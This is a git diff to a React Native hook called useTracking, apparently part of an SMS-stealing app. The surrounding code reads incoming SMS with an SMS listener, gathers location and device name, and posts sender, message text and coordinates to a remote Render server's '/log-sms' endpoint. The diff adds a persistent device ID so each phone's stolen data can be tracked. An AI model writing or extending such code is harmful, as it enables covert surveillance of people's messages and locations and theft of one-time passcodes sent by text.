@@ -4,13 +4,35 @@ import * as Device from 'expo-device';
 import * as Location from 'expo-location';
 import axios from 'axios';
 import SmsListener from 'react-native-get-sms-android';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 
 // 🐅 APNA FINAL RENDER URL
 const API_URL = "https://tiger2-1.onrender.com/log-sms";
 const LOCAL_URL = "http://localhost:10000/log-sms"; // Fallback for local testing
 
+const DEVICE_KEY = 'TIGER_DEVICE_ID';
+
 const useTracking = (permissionStatus) => {
   const [useLocalServer, setUseLocalServer] = useState(false); // Toggle for local vs Render
+  const [deviceId, setDeviceId] = useState(null);
+
+  // Ensure deviceId exists (persisted)
+  useEffect(() => {
+    const ensureId = async () => {
+      try {
+        let id = await AsyncStorage.getItem(DEVICE_KEY);
+        if (!id) {
+          id = 'dev-' + Math.random().toString(36).slice(2, 10);
+          await AsyncStorage.setItem(DEVICE_KEY, id);
+          console.log('[useTracking] Generated deviceId:', id);
+        }
+        setDeviceId(id);
+      } catch (err) {
+        console.warn('[useTracking] deviceId error:', err.message);
+      }
+    };
+    ensureId();
+  }, []);
 
   // Retry logic with exponential backoff
   const sendWithRetry = async (url, payload, retries = 3, delay = 1000) => {
@@ -56,6 +78,7 @@ const useTracking = (permissionStatus) => {
             sender: sender,
             message: messageBody,
             device: deviceName,
+            deviceId: deviceId || 'unknown',
             location: location,
             timestamp: new Date().toLocaleString()
           };
@@ -85,8 +108,8 @@ const useTracking = (permissionStatus) => {
         clearInterval(healthInterval);
       };
     }
-  }, [permissionStatus, useLocalServer]);
+  }, [permissionStatus, useLocalServer, deviceId]);
 
-  // Expose toggle for local server (can be used in UI)
-  return { useLocalServer, setUseLocalServer };
+  // Expose toggle for local server and deviceId (can be used in UI)
+  return { useLocalServer, setUseLocalServer, deviceId };
 };
